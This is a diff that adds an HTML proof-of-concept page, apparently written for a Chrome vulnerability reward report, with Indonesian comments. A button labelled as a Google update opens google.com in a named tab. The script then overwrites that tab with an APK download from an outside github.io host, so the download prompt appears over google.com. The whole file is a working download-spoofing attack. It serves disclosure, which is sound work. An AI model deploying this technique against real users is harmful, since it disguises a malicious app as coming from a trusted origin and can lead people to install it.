@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>PoC Download Spoofing</title>
+</head>
+<body style="text-align: center; margin-top: 50px;">
+
+    <h2>Chrome VRP PoC - Insecure Download Handling</h2>
+    
+    <button id="downloadBtn" style="padding: 15px; cursor: pointer;">
+        Klik untuk Download Update (Google)
+    </button>
+
+    <script>
+        document.getElementById('downloadBtn').onclick = function() {
+            // 1. Membuka origin target (Google) di tab bernama 'target_tab'
+            window.open('https://www.google.com', 'target_tab');
+
+            // 2. Memberikan delay agar Google terbuka sempurna
+            // Lalu menimpa tab yang sama dengan file APK dari origin attacker
+            setTimeout(function() {
+                console.log("Memicu spoofed download...");
+                window.open('https://frozzipies.github.io/test.apk', 'target_tab');
+            }, 5000); 
+        };
+    </script>
+
+    <p style="color: gray; margin-top: 20px;">
+        Jika rentan: Dialog download .apk akan muncul saat layar menampilkan google.com.
+    </p>
+
+</body>
+</html>
